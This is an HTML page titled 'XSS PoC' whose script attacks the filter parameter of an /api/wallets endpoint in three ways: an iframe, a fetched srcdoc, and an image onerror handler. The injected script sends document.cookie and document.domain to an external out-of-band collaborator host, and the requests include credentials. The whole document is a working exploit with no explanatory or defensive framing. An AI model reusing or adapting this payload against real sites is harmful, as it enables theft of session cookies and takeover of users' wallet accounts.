<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC</title>
</head>
<body>
<script>
const collab = 'tkhc89fc2l3thl98ptwzq8tu6lcc06ov.oastify.com';

// Multiple injection methods
const methods = [
    // Method 1: Iframe with src
    () => {
        const iframe = document.createElement('iframe');
        iframe.src = `/api/wallets?filter=<script>fetch('http://${collab}/m1'+document.cookie.substr(0,50))<\/script>`;
        document.body.appendChild(iframe);
    },
    
    // Method 2: Iframe with srcdoc (fetch first)
    () => {
        fetch(`/api/wallets?filter=<script>fetch('http://${collab}/m2'+document.domain)<\/script>`, {credentials: 'include'})
            .then(r => r.text())
            .then(t => {
                const iframe = document.createElement('iframe');
                iframe.srcdoc = t;
                document.body.appendChild(iframe);
            });
    },
    
    // Method 3: Image with error handler
    () => {
        const img = document.createElement('img');
        img.src = 'x';
        img.onerror = () => {
            fetch(`/api/wallets?filter=<img src=x onerror="fetch('http://${collab}/m3')">`, {credentials: 'include'})
                .then(r => r.text())
                .then(t => document.body.innerHTML += t);
        };
        document.body.appendChild(img);
    }
];

// Execute all methods
methods.forEach((method, i) => {
    setTimeout(() => method(), i * 1000);
});
</script>
</body>
</html>
